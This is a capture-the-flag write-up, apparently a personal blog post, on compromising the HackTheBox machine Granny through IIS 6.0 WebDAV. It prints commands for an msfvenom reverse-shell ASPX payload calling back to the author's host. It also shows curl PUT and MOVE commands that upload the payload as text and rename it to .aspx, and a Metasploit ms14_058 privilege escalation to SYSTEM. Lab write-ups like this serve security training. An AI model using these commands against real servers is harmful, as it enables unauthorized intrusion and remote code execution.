---
layout: post
title: "HTB: GRANNY (10.10.10.15)"
description: "Granny is an easy windows box from HackTheBox running webdav that allows uploading of certain  file extensions and blocking others. I will use curl to upload an aspx shell as txt file and later use curl to move it to an aspx extension which will execute on the webserver to gain initial foothold. In root I will use local_exploit_suggester, a module on metasploit, to serach for local exploits to privesc to nt authority."
tags: [granny, HTB, HackTheBox, wedav, curl, PUT, MOVE, msfvenom, metasploit, local_exploit_suggester, davtest]
image: "/assets/img/granny/feature.png"
---
## RECON
### Nmap

As always we start off with the recon and enumeration process to get an overview of our attack surface and target's running service.

```sh
┌─[george@parrot]─[~/HTB/boxes/granny]
└──╼ $ sudo nmap -p- --min-rate 10000 -oA nmap/allports 10.10.10.15
[sudo] password for george:
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-07 00:12 EAT
Nmap scan report for 10.10.10.15
Host is up (0.25s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 18.63 seconds
┌─[george@parrot]─[~/HTB/boxes/granny]
└──╼ $ sudo nmap -p80 -sC -sV -oA nmap/granny 10.10.10.15
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-07 00:14 EAT
Nmap scan report for 10.10.10.15
Host is up (0.23s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
|_http-server-header: Microsoft-IIS/6.0
| http-webdav-scan:
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   Server Type: Microsoft-IIS/6.0
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_  Server Date: Fri, 06 Oct 2023 21:15:52 GMT
| http-methods:
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-title: Under Construction
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.40 seconds
```

From the result we only see one port open. I also not some risky allowed methods.

### Port enumeration
#### TCP Port 80(HTTP)

Visiting the webpage, I get an error page stating site is still under Construction.

![Error](/assets/img/granny/port80.png)

#### Directory Bruteforce

`gobuster` doesnt find much except for empty directories.

```shell
┌─[george@parrot]─[~/HTB/boxes/granny]
└──╼ $ gobuster dir -u http://10.10.10.15/ -w /opt/Seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 30 -x asp,aspx
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.15/
[+] Threads:        30
[+] Wordlist:       /opt/Seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     aspx,asp
[+] Timeout:        10s
===============================================================
2023/10/14 00:57:38 Starting gobuster
===============================================================
/images (Status: 301)
/Images (Status: 301)
/IMAGES (Status: 301)

```
#### Response headers

When I proxy the traffic through `burpsuite`, I note `APS.NET` on the `X-Powered-By` header which means the server can process `ASP` or `ASPX` files

![Response Headers](/assets/img/granny/response_headers.png)

## Shell as network service

### Attempting to upload an ASPX shell

I tried uploading a test file but it failed.

```shell
┌─[george@parrot]─[~/HTB/boxes/granny]
└──╼ $ curl -X PUT http://10.10.10.15/test.aspx -d test.aspx
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<HTML><HEAD><TITLE>The page cannot be displayed</TITLE>
<META HTTP-EQUIV="Content-Type" Content="text/html; charset=Windows-1252">
<STYLE type="text/css">
  BODY { font: 8pt/12pt verdana }
  H1 { font: 13pt/15pt verdana }
  H2 { font: 8pt/12pt verdana }
  A:link { color: red }
  A:visited { color: maroon }
</STYLE>
</HEAD><BODY><TABLE width=500 border=0 cellspacing=10><TR><TD>

<h1>The page cannot be displayed</h1>
You have attempted to execute a CGI, ISAPI, or other executable program from a directory that does not allow programs to be executed.
<hr>
<p>Please try the following:</p>
<ul>
<li>Contact the Web site administrator if you believe this directory should allow execute access.</li>
</ul>
<h2>HTTP Error 403.1 - Forbidden: Execute access is denied.<br>Internet Information Services (IIS)</h2>
<hr>
<p>Technical Information (for support personnel)</p>
<ul>
<li>Go to <a href="http://go.microsoft.com/fwlink/?linkid=8180">Microsoft Product Support Services</a> and perform a title search for the words <b>HTTP</b> and <b>403</b>.</li>
<li>Open <b>IIS Help</b>, which is accessible in IIS Manager (inetmgr),
 and search for topics titled <b>Configuring ISAPI Extensions</b>, <b>Configuring CGI Applications</b>, <b>Securing Your Site with Web Site Permissions</b>, and <b>About Custom Error Messages</b>.</li>
<li>In the IIS Software Development Kit (SDK) or at the <a href="http://go.microsoft.com/fwlink/?LinkId=8181">MSDN Online Library</a>, search for topics titled <b>Developing ISAPI Extensions</b>, <b>ISAPI and CGI</b>, and <b>Debugging ISAPI Extensions and Filters</b>.</li>
</ul>

</TD></TR></TABLE></BODY></HTML>

```
### davtest

I did a little research on `webdav` and found out that it is an Internet-based open standard that enables editing Web sites over HTTP and HTTPS connections. WebDAV yields several advantages over the File Transfer Protocol (FTP), the most notable advantages are more security options and the ability to use a single TCP port for all communication.

I also found a tool called `davtest` which tests WebDAV enabled servers by uploading test executable files, and then (optionally) uploading files which allow for command execution or other actions directly on the target. It is meant for penetration testers to quickly and easily determine if enabled DAV services are exploitable.

When I run `davtest` I see we cannot upload an `asp` or `aspx` file as it fails.

Good news, we can at least upload `txt` file and move it to `aspx` then run it.

```sh
┌─[george@parrot]─[~/HTB/boxes/granny]
└──╼ $ davtest -url http://10.10.10.15
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://10.10.10.15
********************************************************
NOTE    Random string for this session: bob0oIPR3EZcv
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://10.10.10.15/DavTestDir_bob0oIPR3EZcv
********************************************************
 Sending test files
PUT     cgi     FAIL
PUT     html    SUCCEED:        http://10.10.10.15/DavTestDir_bob0oIPR3EZcv/davtest_bob0oIPR3EZcv.html
PUT     jsp     SUCCEED:        http://10.10.10.15/DavTestDir_bob0oIPR3EZcv/davtest_bob0oIPR3EZcv.jsp
PUT     pl      SUCCEED:        http://10.10.10.15/DavTestDir_bob0oIPR3EZcv/davtest_bob0oIPR3EZcv.pl
PUT     aspx    FAIL
PUT     cfm     SUCCEED:        http://10.10.10.15/DavTestDir_bob0oIPR3EZcv/davtest_bob0oIPR3EZcv.cfm
PUT     shtml   FAIL
PUT     jhtml   SUCCEED:        http://10.10.10.15/DavTestDir_bob0oIPR3EZcv/davtest_bob0oIPR3EZcv.jhtml
PUT     php     SUCCEED:        http://10.10.10.15/DavTestDir_bob0oIPR3EZcv/davtest_bob0oIPR3EZcv.php
PUT     asp     FAIL
PUT     txt     SUCCEED:        http://10.10.10.15/DavTestDir_bob0oIPR3EZcv/davtest_bob0oIPR3EZcv.txt
********************************************************
 Checking for test file execution
EXEC    html    SUCCEED:        http://10.10.10.15/DavTestDir_bob0oIPR3EZcv/davtest_bob0oIPR3EZcv.html
EXEC    jsp     FAIL
EXEC    pl      FAIL
EXEC    cfm     FAIL
EXEC    jhtml   FAIL
EXEC    php     FAIL
EXEC    txt     SUCCEED:        http://10.10.10.15/DavTestDir_bob0oIPR3EZcv/davtest_bob0oIPR3EZcv.txt

********************************************************
/usr/bin/davtest Summary:
Created: http://10.10.10.15/DavTestDir_bob0oIPR3EZcv
PUT File: http://10.10.10.15/DavTestDir_bob0oIPR3EZcv/davtest_bob0oIPR3EZcv.html
PUT File: http://10.10.10.15/DavTestDir_bob0oIPR3EZcv/davtest_bob0oIPR3EZcv.jsp
PUT File: http://10.10.10.15/DavTestDir_bob0oIPR3EZcv/davtest_bob0oIPR3EZcv.pl
PUT File: http://10.10.10.15/DavTestDir_bob0oIPR3EZcv/davtest_bob0oIPR3EZcv.cfm
PUT File: http://10.10.10.15/DavTestDir_bob0oIPR3EZcv/davtest_bob0oIPR3EZcv.jhtml
PUT File: http://10.10.10.15/DavTestDir_bob0oIPR3EZcv/davtest_bob0oIPR3EZcv.php
PUT File: http://10.10.10.15/DavTestDir_bob0oIPR3EZcv/davtest_bob0oIPR3EZcv.txt
Executes: http://10.10.10.15/DavTestDir_bob0oIPR3EZcv/davtest_bob0oIPR3EZcv.html
Executes: http://10.10.10.15/DavTestDir_bob0oIPR3EZcv/davtest_bob0oIPR3EZcv.txt
```
Using one of the successfully uploaded `txt` files, I will visit the path on my browser to see if it worked.

![Text Uploaded](/assets/img/granny/txt_upload.png)

Yeey!! now lets get that shell.

#### Shell With metasploit

I will create a  `payload` using `msfvenom` and upload it as a `txt` file

```sh
┌─[george@parrot]─[~/HTB/boxes/granny]
└──╼ $ msfvenom -p windows/shell/reverse_tcp LHOST=10.10.16.7 LPORT=9001 -f aspx > shell.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of aspx file: 2886 bytes
```
Using `curl` I will upload the file file to the box as `shell.txt`.

```sh
┌─[george@parrot]─[~/HTB/boxes/granny]
└──╼ $ curl -X PUT http://10.10.10.15/shell.txt -d @shell.aspx
┌─[george@parrot]─[~/HTB/boxes/granny]
└──╼ $
```

right of the bat I notice when I view the txt file it has a lot of whitespace which is not a good sign.

![White whitespace](/assets/img/granny/shell_txt_fail.png)

Looking at the `man` page for `curl` I note there is another option that uploads data in the same exact format it was.

```sh
┌─[george@parrot]─[~/HTB/boxes/granny]
└──╼ $ man curl
---------------------snip-------------------------------------
--data-binary <data>
             (HTTP) This posts data exactly as specified with no extra processing whatsoever.

             If you start the data with the letter @, the rest should be a filename. Data is posted in a similar manner as -d, --data does, except that newlines and carriage returns are preserved and conversions are never done.

             Like  -d, --data the default content-type sent to the server is application/x-www-form-urlencoded. If you want the data to be treated as arbitrary binary data by the server then set the content-type to octet-stream: -H "Content-Type:
             application/octet-stream".

             If this option is used several times, the ones following the first will append data as described in -d, --data.

             --data-binary can be used several times in a command line

             Example:
              curl --data-binary @filename https://example.com
```
I will try this out

```sh
┌─[george@parrot]─[~/HTB/boxes/granny]
└──╼ $ curl -X PUT http://10.10.10.15/shell.txt --data-binary @shell.aspx
┌─[george@parrot]─[~/HTB/boxes/granny]
└──╼ $
```

And this looks way better

![Much Better](/assets/img/granny/better.png)

Since nmap told us we have the `MOVE` capabilities on the server. I will still leverage `curls` extensive features to rename the file to an `aspx` extension so that the server  can process it.

```sh
┌─[✗]─[george@parrot]─[~/HTB/boxes/granny]
└──╼ $ curl -X MOVE --header 'Destination:http://10.10.10.15/shell.aspx' 'http://10.10.10.15/shell.txt'
```
On my other terminal I will spin up `metasploit` and set up a reverse_tcp on my `tun0` interface.

```sh
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.16.7       yes       The listen address (an interface may be specified)
   LPORT     9001             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run

[*] Started reverse TCP handler on 10.10.16.7:9001
```

Back to my browser, I will visit  `http://10.10.10.15/shell.aspx` which is a blank page, greate sign :) hopefully.

Checking my `metasploit` listener, and we have `shell` on the box.

```sh
-------snip-------
[*] Started reverse TCP handler on 10.10.16.7:9001
[*] Sending stage (175686 bytes) to 10.10.10.15
[*] Meterpreter session 1 opened (10.10.16.7:9001 -> 10.10.10.15:1030) at 2023-10-13 23:45:45 +0300

(Meterpreter 1)(c:\windows\system32\inetsrv) > getuid
Server username: NT AUTHORITY\NETWORK SERVICE

(Meterpreter 1)(c:\windows\system32\inetsrv) > shell
Process 2940 created.
Channel 1 created.
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service

```

## Shell as nt authority
### Enumeration

from `IIS` version, the box seems like an old Windows box hence I will check local exploits which is quite convinient as metasploit includes a module for that.

The Local Exploit Suggester is a post-exploitation module that you can use to check a system for local vulnerabilities. It performs local exploit checks; it does not actually run any exploits, which is useful because this means you to scan a system without being intrusive. In addition to being stealthy, it's a time saver. You don't have to manually search for local exploits that will work; it'll show you which exploits the target is vulnerable to based on the system's platform and architecture.

The module only requires us to set a session id. Since my initial session died, i got a new one as session 2

```sh
[msf](Jobs:0 Agents:1) exploit(multi/handler) >> use post/multi/recon/local_exploit_suggester                              
[*] Using configured payload windows/meterpreter/reverse_tcp                                                                                                                                                                                                  
[msf](Jobs:0 Agents:1) post(multi/recon/local_exploit_suggester) >> options                                                

Module options (post/multi/recon/local_exploit_suggester):                                                                     

   Name             Current Setting  Required  Description                                                                     
   ----             ---------------  --------  -----------                                                                     
   SESSION                           yes       The session to run this module on                                           
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits                  


View the full module info with the info, or info -d command.                                                                                                                                                                                                  

[msf](Jobs:0 Agents:1) post(multi/recon/local_exploit_suggester) >> set session 2                                          
session => 2                                                                                                                   
[msf](Jobs:0 Agents:1) post(multi/recon/local_exploit_suggester) >> run

[*] 10.10.10.15 - Collecting local exploits for x86/windows...                                                                 
[*] 10.10.10.15 - 188 exploit checks are being tried...     
[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Running check method for exploit 41 / 41      
[*] 10.10.10.15 - Valid modules for session 2:                                                                                 
============================         
```
I see severall I can use so I will pick the first one that says `vulnerable`.

Be sure to check the `options` and see if the `LHOST` is set correctly, sometimes this can be the reason you are not getting a shell.

```sh
[msf](Jobs:0 Agents:1) post(multi/recon/local_exploit_suggester) >> use exploit/windows/local/ms14_058_track_popup_menu                                                                                                                                       
[*] Using configured payload windows/meterpreter/reverse_tcp                                                                                                                                                                                                  
[msf](Jobs:0 Agents:1) exploit(windows/local/ms14_058_track_popup_menu) >> set session 2                                                                                                                                                                      
session => 2                                                                                                                                                                                                                                                  
[msf](Jobs:0 Agents:1) exploit(windows/local/ms14_058_track_popup_menu) >> options                                                                                                                                                                            

Module options (exploit/windows/local/ms14_058_track_popup_menu):                                                                                                                                                                                             

   Name     Current Setting  Required  Description                                                                                                                                                                                                            
   ----     ---------------  --------  -----------                                                                                                                                                                                                            
   SESSION  2                yes       The session to run this module on                                                                                                                                                                                      


Payload options (windows/meterpreter/reverse_tcp):                                                                                                                                                                                                            

   Name      Current Setting  Required  Description                                                                                                                                                                                                           
   ----      ---------------  --------  -----------                                                                                                                                                                                                           
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)                                                                                                                                                             
   LHOST                      yes       The listen address (an interface may be specified)                                                                                                                                                                    
   LPORT     4444             yes       The listen port                                                                                                                                                                                                       


Exploit target:                                                                                                                                                                                                                                               

   Id  Name                                                                                                                                                                                                                                                   
   --  ----                                                                                                                                                                                                                                                   
   0   Windows x86                                                                                                                                                                                                                                            



View the full module info with the info, or info -d command.                                                                                                                                                                                                  

[msf](Jobs:0 Agents:1) exploit(windows/local/ms14_058_track_popup_menu) >> set LHOST 10.10.16.7
LHOST => 10.10.16.7                     
```
### Shell

After executing it, I get a shell as `administrator`

```
[msf](Jobs:0 Agents:1) exploit(windows/local/ms14_058_track_popup_menu) >> run

[*] Started reverse TCP handler on 10.10.16.7:4444
[*] Reflectively injecting the exploit DLL and triggering the exploit...
[*] Launching msiexec to host the DLL...     
[+] Process 2204 launched.                        
[*] Reflectively injecting the DLL into 2204...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175686 bytes) to 10.10.10.15
[*] Meterpreter session 3 opened (10.10.16.7:4444 -> 10.10.10.15:1032) at 2023-10-14 00:15:05 +0300

(Meterpreter 3)(c:\windows\system32\inetsrv) > shell
Process 3084 created.           
Channel 1 created.                
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.      

c:\windows\system32\inetsrv>whoami      
whoami                                   
nt authority\system                           
```

We can also get our flags

```
C:\Documents and Settings\Lakis\Desktop>type user.txt
type user.txt
700c5dc163014e22b3e4*************
C:\Documents and Settings\Lakis\Desktop>cd ../../administrator
cd ../../administrator

C:\Documents and Settings\Administrator>cd desktop
cd desktop

C:\Documents and Settings\Administrator\Desktop>type root.txt
type root.txt
aa4beed1c0584445ab463a************
C:\Documents and Settings\Administrator\Desktop>
```

And thats the box. Thank you all for taking your time to read my blog post, stay tuned for the next!

Happy hacking!
